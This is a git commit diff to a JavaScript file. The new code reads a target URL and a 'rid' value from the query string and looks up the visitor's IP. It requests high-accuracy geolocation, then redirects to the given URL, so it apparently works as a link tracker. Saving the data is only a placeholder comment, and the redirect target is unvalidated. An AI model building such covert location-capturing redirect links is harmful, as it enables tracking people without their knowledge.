0c3376da535a69a12516097f202ff157b1ad45f2
Roberto Manfreda <robertomanfreda1994@gmail.com>
2021-03-02 16:59:33 +0100

    [UPDATE]

--- js/script.js
+++ js/script.js
@@ -1,19 +1,66 @@
-function grabIp() {
-    var request = new XMLHttpRequest();
-	request.open('GET', 'https://api.ipify.org?format=json', false);
-    request.setRequestHeader("Content-type", "application/json");
-	request.send(null);
+var url
+var rid
 
-	if (request.status === 200) {
-  		var obj = JSON.parse(request.responseText);
-  		document.getElementById("ip").innerHTML=obj.ip;
-	}
+var ip
+var lat
+var long
+
+window.onload = function() {
+  grabGeo();
+  prepare();
+};
+
+function prepare() {
+  const queryString = window.location.search;
+  const urlParams = new URLSearchParams(queryString);
+  url = urlParams.get("url")
+  rid = urlParams.get("rid")
+
+  console.log("url: " + url);
+  console.log("rid: " + rid);
+
+  aggregate();
+}
+
+function grabIp() {
+  var request = new XMLHttpRequest();
+  request.open('GET', 'https://api.ipify.org?format=json', false);
+  request.setRequestHeader("Content-type", "application/json");
+  request.send(null);
+
+  if (request.status === 200) {
+      var obj = JSON.parse(request.responseText);
+      ip = obj.ip
+  }
 }
 
 function grabGeo() {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(function(position) {
-  		document.getElementById("location").innerHTML = position.coords.latitude + "," + position.coords.longitude + ",5z";
-    });
+  var options = {
+    enableHighAccuracy: true,
+    maximumAge: 0
+  };
+
+  function success(pos) {
+    lat = pos.coords.latitude;
+    long = pos.coords.longitude;
+
+    // save data
+
+    redirect();
   }
+
+  function error(err) {
+    redirect();
+  }
+
+  navigator.geolocation.getCurrentPosition(success, error, options);
+}
+
+function redirect() {
+  window.location.href = url;
+}
+
+function aggregate() {
+  grabIp();
+  grabGeo();
 }
